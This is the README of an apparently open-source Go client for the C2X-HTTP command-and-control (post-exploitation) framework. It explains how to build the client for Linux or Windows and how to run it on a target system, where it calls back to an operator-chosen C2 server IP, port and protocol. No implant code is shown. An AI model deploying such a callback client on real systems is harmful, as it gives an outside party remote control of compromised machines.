# C2X-HTTP-Client-Go

[![Tool Category](https://badgen.net/badge/Tool/C2%20Client/black)](https://github.com/nxenon/c2x-http-client-go)
[![APP Version](https://badgen.net/badge/Version/Beta/red)](https://github.com/nxenon/c2x-http-client-go)
[![Go Version](https://badgen.net/badge/Go/1.13/blue)](https://golang.org/doc/go1.13)
[![License](https://badgen.net/badge/License/GPLv2/purple)](https://github.com/nxenon/c2x-http-client-go/blob/master/LICENSE)

C2x-HTTP-Client-Go is client of [C2X-HTTP](https://github.com/nxenon/c2x-http) (C2/Post Exploitation) project in Go language.

This script does not work when you are using HTTPS protocol when you are using `self-signed` certificate for C2X-HTTP server.

Installation & Building
----
    You have to first install Go version 1.13
    Run:
    git clone https://github.com/nxenon/c2x-http-client-go.git
    cd c2x-http-client-go
    edit c2x-http-client.go and put the server IP, Port and server protocol in lines 27 ,28 & 29
    if you want the client to run in
    Linux :
    GOOS=linux go build c2x-http-client.go
    Windows :
    GOOS=windows go build c2x-http-client.go
    now you have c2x-http-client compiled.
    run it in target system and wait to connect to c2x server

Run
----
- If you have replaced the ip and port in source code and then compiled you can run the code without any argument.
    - ./c2x-http-client
- If you didn't replace the ip and port, or you want to connect to different server or port you can use arguments.
    - ./c2x-http-client --ip 127.0.0.1 --port 54321 --protocol http

- Optional Arguments
    - --ip       Remote_IP
    - --port     Remote_Port
    - --protocol Protocol [http or https]